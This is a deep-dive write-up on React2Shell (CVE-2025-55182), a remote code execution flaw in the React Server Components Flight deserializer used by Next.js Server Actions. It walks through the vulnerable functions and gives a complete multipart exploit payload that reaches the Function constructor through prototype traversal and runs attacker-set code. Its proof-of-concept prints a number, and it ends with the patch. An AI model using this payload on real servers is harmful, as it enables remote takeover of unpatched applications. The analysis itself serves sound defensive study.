# React2Shell (CVE-2025-55182) - Complete Execution Flow Deep Dive

## Table of Contents
1. [Background: What is the Flight Protocol?](#1-background-what-is-the-flight-protocol)
2. [The Vulnerable Code Path](#2-the-vulnerable-code-path)
3. [The Payload Structure Decoded](#3-the-payload-structure-decoded)
4. [Step-by-Step Execution Flow](#4-step-by-step-execution-flow)
5. [The Complete Call Stack](#5-the-complete-call-stack)
6. [Why Each Piece is Necessary](#6-why-each-piece-is-necessary)

---

## 1. Background: What is the Flight Protocol?

### 1.1 React Server Components (RSC)

React Server Components allow parts of your React application to run on the server. When a client needs data from a server component, it sends a request to a server endpoint. The server processes this and returns a serialized representation called a "Flight" payload.

### 1.2 The Flight Protocol Format

The Flight protocol is a streaming wire format for transmitting React component trees. It uses a line-delimited text format:

```
<chunk_id>:<type_marker><serialized_data>
```

Or in multipart/form-data (for Server Actions):
```
files = {
    "0": (None, '["$1"]'),
    "1": (None, '{"name":"$2:value"}'),
    "2": (None, '{"value":"hello"}'),
}
```

### 1.3 Reference Types in Flight Protocol

| Expression | Type | Description |
|------------|------|-------------|
| `$$` | Escaped $ | Literal string starting with $ |
| `$0-9a-f` | Chunk Reference | Reference to chunk by hex ID (e.g., `$1`, `$a`) |
| `$@` | Promise/Chunk | Raw reference to chunk Promise itself |
| `$B` | Blob | Blob data reference |
| `$F` | Server Reference | Server function reference |
| `$T` | Temporary Ref | Opaque temporary reference |
| `$Q` | Map | Map object |
| `$W` | Set | Set object |
| `$K` | FormData | FormData object |

### 1.4 The Colon Notation for Property Traversal

The Flight protocol supports property traversal using `:` notation:

```javascript
// "$1:name:value" means:
// 1. Get chunk 1
// 2. Access .name property
// 3. Access .value property of that

// In code:
let obj = chunks[1];      // Get chunk 1
obj = obj["name"];        // Access .name
obj = obj["value"];       // Access .value
```

---

## 2. The Vulnerable Code Path

### 2.1 Entry Point: decodeReplyFromBusboy

When a Server Action request arrives with multipart/form-data, Next.js calls:

```javascript
// packages/next/src/server/app-render/action-handler.ts:879
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
```

### 2.2 The decodeReplyFromBusboy Function

```javascript
// Simplified from react-server-dom-webpack
exports.decodeReplyFromBusboy = function(busboyStream, webpackMap, options) {
    // Create a Response object to track deserialization state
    var response = createResponse(
        webpackMap,      // bundlerConfig
        "",              // formFieldPrefix
        options ? options.temporaryReferences : void 0
    );
    
    var pendingFiles = 0;
    var queuedFields = [];
    
    // Process each form field
    busboyStream.on("field", function(name, value) {
        if (0 < pendingFiles) {
            queuedFields.push(name, value);
        } else {
            try {
                resolveField(response, name, value);
            } catch (error) {
                busboyStream.destroy(error);
            }
        }
    });
    
    busboyStream.on("finish", function() {
        close(response);
    });
    
    // CRITICAL: Returns chunk 0 - this is where exploitation begins
    return getChunk(response, 0);
};
```

### 2.3 The parseModelString Function (Core Deserializer)

This is the core deserialization function that processes Flight references:

```javascript
// ReactFlightReplyServer.js - parseModelString (simplified)
function parseModelString(response, parentObject, key, value) {
    // If value doesn't start with '$', return as-is
    if (value[0] !== '$') {
        return value;
    }
    
    // Handle different reference types based on second character
    switch (value[1]) {
        case '$':
            // Escaped $ character: "$$hello" → "$hello"
            return value.slice(1);
        
        case '@': {
            // Promise reference: "$@0" returns the actual chunk object
            // VULNERABILITY ENABLER #1: Returns raw chunk reference
            const id = parseInt(value.slice(2), 16);
            const chunk = getChunk(response, id);
            return chunk;  // Returns the Promise/Chunk object itself!
        }
        
        case 'B': {
            // Blob reference: "$B3" 
            // VULNERABILITY TRIGGER: This is where RCE happens!
            const id = parseInt(value.slice(2), 16);
            const prefix = response._prefix;
            const blobKey = prefix + id;
            
            // This line is the RCE trigger:
            // response._formData.get(response._prefix + id)
            // 
            // If attacker controls response._formData.get and response._prefix,
            // this becomes: Function("malicious_code" + id)
            const backingEntry = response._formData.get(blobKey);
            return backingEntry;
        }
        
        default: {
            // Regular chunk reference: "$1" resolves chunk 1
            const refId = parseInt(value.slice(1), 16);
            return getOrResolveChunk(response, refId);
        }
    }
}
```

### 2.4 The getOutlinedModel Function (Property Traversal)

This function handles the colon notation for property access:

```javascript
// ReactFlightReplyServer.js:595 (VULNERABLE VERSION)
function getOutlinedModel(response, reference, parentObject, key, map) {
    // Split reference by ':' to get property path
    // e.g., "$1:__proto__:then" → ["1", "__proto__", "then"]
    const path = reference.split(':');
    const id = parseInt(path[0], 16);
    const chunk = getChunk(response, id);
    
    // Initialize chunk if needed
    switch (chunk.status) {
        case RESOLVED_MODEL:
            initializeModelChunk(chunk);
            break;
    }
    
    switch (chunk.status) {
        case INITIALIZED:
            let value = chunk.value;
            
            // VULNERABILITY #2: No validation on property names!
            // This allows accessing __proto__, constructor, etc.
            for (let i = 1; i < path.length; i++) {
                value = value[path[i]];  // No hasOwnProperty check!
            }
            
            return map(response, value);
    }
    // ... error handling
}
```

### 2.5 The Chunk.prototype.then Function

Chunks inherit from Promise and have a custom `.then()` method:

```javascript
// ReactFlightReplyServer.js:125
Chunk.prototype = Object.create(Promise.prototype);

Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;
    
    // If chunk is resolved_model, initialize it
    switch (chunk.status) {
        case RESOLVED_MODEL:
            initializeModelChunk(chunk);  // CRITICAL: Attacker can trigger this!
            break;
    }
    
    // After initialization, resolve with chunk.value
    switch (chunk.status) {
        case INITIALIZED:
            resolve(chunk.value);  // If chunk.value is thenable, chains continue!
            break;
        case PENDING:
        case BLOCKED:
        case CYCLIC:
            if (resolve) {
                if (chunk.value === null) {
                    chunk.value = [];
                }
                chunk.value.push(resolve);
            }
            if (reject) {
                if (chunk.reason === null) {
                    chunk.reason = [];
                }
                chunk.reason.push(reject);
            }
            break;
        // ... other cases
    }
};
```

### 2.6 The initializeModelChunk Function

```javascript
// ReactFlightReplyServer.js:446
function initializeModelChunk(chunk) {
    const prevChunk = initializingChunk;
    const prevBlocked = initializingChunkBlockedModel;
    initializingChunk = chunk;
    initializingChunkBlockedModel = null;
    
    const resolvedModel = chunk.value;  // Attacker-controlled JSON string
    
    // Set status to CYCLIC to handle circular references
    const cyclicChunk = chunk;
    cyclicChunk.status = CYCLIC;
    cyclicChunk.value = null;
    cyclicChunk.reason = null;
    
    try {
        // CRITICAL: Parses attacker-controlled JSON
        const rawModel = JSON.parse(resolvedModel);
        
        // CRITICAL: Calls reviveModel with attacker-controlled _response
        const value = reviveModel(
            chunk._response,  // Attacker controls this!
            { '': rawModel }, // The parsed JSON
            '',
            rawModel
        );
        
        // ... rest of initialization
    } catch (error) {
        // ... error handling
    }
}
```

---

## 3. The Payload Structure Decoded

Let's examine the exploit payload piece by piece:

```javascript
const payload = {
    '0': '$1',
    '1': {
        'status': 'resolved_model',
        'reason': 0,
        '_response': '$4',
        'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then': '$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix': 'console.log(7*7+1)//',
        '_formData': {
            'get': '$3:constructor:constructor'
        },
        '_chunks': '$2:_response:_chunks',
    }
}
```

### 3.1 Chunk 0: The Entry Point

```javascript
'0': '$1'
```

- **Purpose**: Entry point for deserialization
- **Meaning**: "Resolve chunk 1 and return its value"
- **Why it's needed**: `decodeReplyFromBusboy` returns `getChunk(response, 0)`, so chunk 0 is always the starting point

### 3.2 Chunk 3: The Gadget Foundation

```javascript
'3': []
```

- **Purpose**: Provides access to `Function` constructor via prototype chain
- **The prototype chain**:
  ```javascript
  []                      // Empty array
  [].constructor          // → Array
  Array.constructor       // → Function
  ```
- **Why an array?**: Any object would work, but arrays are simple and have a predictable prototype chain

### 3.3 Chunk 2: The Promise Wrapper

```javascript
'2': '$@3'
```

- **Purpose**: Creates a raw reference to chunk 3 as a Promise-like object
- **The `$@` prefix**: Returns the chunk object itself, not its resolved value
- **Why it's needed**: 
  - `$@3` returns chunk 3 as a Promise
  - This allows `$2:_response:_chunks` to reference internal chunk state
  - Creates circular references needed for the exploit chain

### 3.4 Chunk 4: The Fake Response Object

```javascript
'4': {
    '_prefix': 'console.log(7*7+1)//',
    '_formData': {
        'get': '$3:constructor:constructor'
    },
    '_chunks': '$2:_response:_chunks',
}
```

- **Purpose**: Replaces the legitimate `response` object in deserialization
- **`_prefix`**: The malicious JavaScript code to execute
  - `'console.log(7*7+1)//'` outputs `50`
  - The `//` comments out the appended blob ID
- **`_formData.get`**: Points to `$3:constructor:constructor`
  - Resolves to: `[].constructor.constructor` = `Function`
  - This is the RCE gadget!
- **`_chunks`**: Links into the deserialization context for proper object resolution

### 3.5 Chunk 1: The Exploitation Trigger

```javascript
'1': {
    'status': 'resolved_model',
    'reason': 0,
    '_response': '$4',
    'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    'then': '$2:then'
}
```

This is the most complex chunk. Let's break it down:

#### 3.5.1 Making it look like a Chunk

```javascript
'status': 'resolved_model',
'reason': 0,
```

- `status: 'resolved_model'`: Tells `Chunk.prototype.then` to call `initializeModelChunk`
- `reason: 0`: Placeholder value (used in some code paths)

#### 3.5.2 The Fake Response Reference

```javascript
'_response': '$4'
```

- Points to our crafted fake Response object (chunk 4)
- When `initializeModelChunk` runs, it uses `chunk._response`
- This gives attacker control over `response._formData.get` and `response._prefix`

#### 3.5.3 The Nested JSON Payload

```javascript
'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
```

This is a JSON string that gets parsed during `initializeModelChunk`. Let's decode it:

```javascript
{
    "then": "$3:map",      // Makes outer object thenable via [].map
    "0": {
        "then": "$B3"      // TRIGGER! $B3 creates and calls malicious function
    },
    "length": 1            // Makes object array-like for map() iteration
}
```

**The attack flow**:
1. Outer object has `then` pointing to `[].map` → it's thenable
2. When resolved, `.then()` (which is `Array.map`) is called
3. `map` iterates over `{0: {...}, length: 1}` (array-like object)
4. For item at index 0, it encounters `{then: "$B3"}`
5. This inner object is also thenable
6. Resolving `"$B3"` triggers the `case 'B':` code path with our fake response

#### 3.5.4 The Thenable Setup

```javascript
'then': '$2:then'
```

- Points to `$2:then` which resolves to the `.then` property of chunk 2
- Since chunk 2 is `$@3` (a Promise wrapper around chunk 3)
- `$2:then` could resolve to `Chunk.prototype.then`
- This makes chunk 1 a "thenable" - when awaited, its `.then()` method is called

---

## 4. Step-by-Step Execution Flow

> **For a detailed visual walkthrough showing PAYLOAD → CODE → BEFORE/AFTER for each step, see [payload-walkthrough.md](./payload-walkthrough.md)**

### Overview

The exploit executes in 13 steps:

| Step | What Happens |
|------|--------------|
| 1 | Request arrives with malicious form data (chunks 0-4) |
| 2 | `"0": "$1"` → Chunk 0 references Chunk 1 |
| 3 | `"3": "[]"` → Empty array provides prototype chain access |
| 4 | `$3:constructor:constructor` → Traverses to `Function` constructor |
| 5 | `"2": "$@3"` → Raw Promise reference (not resolved value) |
| 6 | `$2:then` → Gets `Chunk.prototype.then` method |
| 7 | Chunk 1 fully resolved → Now a thenable object |
| 8 | `await` triggers `Chunk.prototype.then` |
| 9 | `initializeModelChunk` parses nested JSON with fake Response |
| 10 | `$3:map` → Gets `Array.prototype.map` |
| 11 | Outer thenable resolves → map() iterates over array-like object |
| 12 | **`$B3` → THE RCE TRIGGER** (Blob handler with fake Response) |
| 13 | Inner thenable resolves → **Malicious function executed!** |

### High-Level Flow

```
await chunk0
  ↓
chunk1.then() called (chunk1.then = Chunk.prototype.then)
  ↓
initializeModelChunk(chunk1) with chunk1._response = FAKE RESPONSE
  ↓
JSON.parse(chunk1.value) → {then: "$3:map", 0: {then: "$B3"}, length: 1}
  ↓
reviveModel with FAKE response resolves "$3:map" → Array.map
  ↓
Outer thenable.then() = Array.map.call(obj, callback)
  ↓
map iterates, finds {then: "$B3"} at index 0
  ↓
"$B3" resolved: FAKE._formData.get(FAKE._prefix + "3")
             = Function("console.log(7*7+1)//3")
  ↓
Inner thenable.then() = maliciousFunction()
  ↓
╔═════════════════════════════════════════════════════╗
║  ARBITRARY CODE EXECUTION ON SERVER!                ║
╚═════════════════════════════════════════════════════╝
```

### Key Transformations

```
"3": []  ─────────────────► [].constructor.constructor ───► Function
                                   (prototype chain)

"2": "$@3"  ──────────────► Chunk object (not value) ─────► Chunk.prototype

"4": {_prefix, _formData} ► Fake Response object ─────────► Controls RCE
     └─ get: "$3:c:c"

"1": {status, _response,  ► Thenable with fake Response ──► Triggers initModel
      value, then}           └─ then = Chunk.prototype.then

"0": "$1"  ───────────────► Entry point ──────────────────► Starts chain
```

---

## 5. The Complete Call Stack

Here's the complete call stack from request to RCE:

```
1.  HTTP Request arrives at Next.js server
2.  └─► action-handler.ts: handleAction()
3.      └─► decodeReplyFromBusboy(busboy, serverModuleMap, options)
4.          ├─► createResponse() → creates Response object
5.          ├─► resolveField() × 5 → populates chunks 0-4
6.          └─► getChunk(response, 0) → returns chunk 0
7.              └─► parseModelString(response, ..., "$1")
8.                  └─► getOrResolveChunk(response, 1)
9.                      └─► (chunk 1 properties are resolved)
10.                         ├─► "$4" → resolves chunk 4 (fake Response)
11.                         │   └─► "$3:constructor:constructor" → Function
12.                         └─► "$2:then" → Chunk.prototype.then
13.                             └─► "$@3" → raw chunk 3 reference
14. ─── chunk 1 is now a thenable with controlled properties ───
15. await chunk1 (or Promise.resolve(chunk1))
16. └─► JavaScript detects 'then' property, calls it
17.     └─► Chunk.prototype.then(resolve, reject)
18.         └─► initializeModelChunk(chunk1)
19.             └─► JSON.parse(chunk1.value) → nested JSON
20.                 └─► reviveModel(chunk4, ...) // chunk4 = fake Response!
21.                     └─► parseModelString(..., "$3:map") → Array.map
22.                     └─► parseModelString(..., "$B3")
23.                         └─► case 'B':
24.                             └─► response._formData.get(response._prefix + 3)
25.                                 └─► Function("console.log(7*7+1)//3")
26.                                     └─► Creates malicious function
27. ─── Function returned as 'then' property of inner object ───
28. Inner object {then: maliciousFunction} is thenable
29. └─► When resolved, maliciousFunction() is called
30.     └─► console.log(50) // RCE ACHIEVED!
```

---

## 6. Why Each Piece is Necessary

### 6.1 Why `$@` (Promise Reference)?

```javascript
'2': '$@3'
```

The `$@` prefix returns the chunk object itself rather than resolving it. This is necessary because:

1. **Access to Chunk.prototype.then**: Using `$2:then` after `$@3` gives access to the actual Promise `.then` method
2. **Circular references**: Allows creating self-referential structures needed for exploitation
3. **Bypassing normal resolution**: Normal `$3` would return the resolved value (`[]`), but `$@3` returns the chunk wrapper

### 6.2 Why the Empty Array `[]`?

```javascript
'3': []
```

The empty array serves as a "gadget factory":

```javascript
[]                          // Any array
    .constructor            // → Array
        .constructor        // → Function (THE RCE GADGET!)
```

This works because:
- All arrays inherit from `Array.prototype`
- `Array.constructor` is `Function` (since Array is a function)
- `Function.constructor` is `Function` itself
- `Function("code")` creates a new function from a string (like `eval`)

### 6.3 Why the Nested JSON in `value`?

```javascript
'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
```

This creates a double-thenable structure:

**Outer thenable** (`{then: "$3:map", ...}`):
- Uses `Array.map` as the `then` method
- When resolved, `map` iterates over the array-like object

**Inner thenable** (`{then: "$B3"}`):
- Triggers the `$B` (Blob) code path
- This is where the actual RCE happens
- When this thenable resolves, the malicious function is called

### 6.4 Why `Array.map` as the Outer `then`?

The outer object uses `Array.map` as its `then`:

```javascript
{then: "$3:map", 0: {...}, length: 1}
```

When this thenable resolves:
```javascript
// JavaScript calls:
obj.then(resolve, reject)

// Which becomes:
Array.prototype.map.call(obj, resolve)

// map() sees {0: {...}, length: 1} as array-like
// It calls resolve({then: "$B3"}) for item at index 0
```

This forces the iteration to process the inner object, which triggers the `$B3` resolution.

### 6.5 Why `//` in the Prefix?

```javascript
'_prefix': 'console.log(7*7+1)//'
```

The `//` at the end is a JavaScript comment. When combined with the blob ID:

```javascript
response._formData.get(response._prefix + id)
// = Function("console.log(7*7+1)//" + 3)
// = Function("console.log(7*7+1)//3")
```

The `//3` becomes a comment, so the generated function is:
```javascript
function anonymous() {
    console.log(7*7+1)//3  // The //3 is just a comment!
}
```

Without the `//`, you'd get a syntax error:
```javascript
Function("console.log(7*7+1)3")  // SyntaxError!
```

### 6.6 Why `status: 'resolved_model'`?

```javascript
'status': 'resolved_model'
```

This status value triggers `initializeModelChunk` in `Chunk.prototype.then`:

```javascript
Chunk.prototype.then = function(resolve, reject) {
    switch (chunk.status) {
        case RESOLVED_MODEL:  // 'resolved_model' matches this!
            initializeModelChunk(chunk);  // Called with attacker-controlled chunk
            break;
    }
    // ...
};
```

Any other status would skip the vulnerable code path.

### 6.7 The Complete Dependency Graph

```
Chunk 0 ──► Chunk 1 (thenable, triggers the chain)
               │
               ├──► Chunk 4 (fake Response)
               │       │
               │       └──► Chunk 3 via "$3:constructor:constructor"
               │               │
               │               └──► Returns Function constructor
               │
               └──► Chunk 2 via "$2:then"
                       │
                       └──► Chunk 3 via "$@3"
                               │
                               └──► Returns Promise wrapper
                               
When resolved: chunk1.then() → initializeModelChunk() → reviveModel() 
    → "$B3" → Function("malicious code") → EXECUTION!
```

---

## Summary: The Three Vulnerabilities Combined

1. **VULN #1: Raw Chunk Access (`$@`)**
   - Allows access to internal chunk objects
   - Enables reaching `Chunk.prototype.then`

2. **VULN #2: Unrestricted Property Traversal (`:` notation)**
   - No `hasOwnProperty` checks
   - Allows accessing `__proto__`, `constructor`, etc.
   - Enables reaching `Function` constructor

3. **VULN #3: Unvalidated Response Object in Blob Handler**
   - `response._formData.get` and `response._prefix` not validated
   - Attacker can substitute a fake Response
   - Enables calling `Function(attacker_code)`

**The Patch**: The fix adds proper validation in `getOutlinedModel` to check that properties actually exist on the object and aren't inherited from the prototype chain:

```javascript
// PATCHED VERSION
function getOutlinedModel(response, reference, parentObject, key, map) {
    const path = reference.split(':');
    // ...
    switch (chunk.status) {
        case INITIALIZED:
            let value = chunk.value;
            for (let i = 1; i < path.length; i++) {
                // NEW: Validate property exists on object itself
                if (!Object.prototype.hasOwnProperty.call(value, path[i])) {
                    throw new Error('Invalid reference');
                }
                value = value[path[i]];
            }
            return map(response, value);
    }
}
```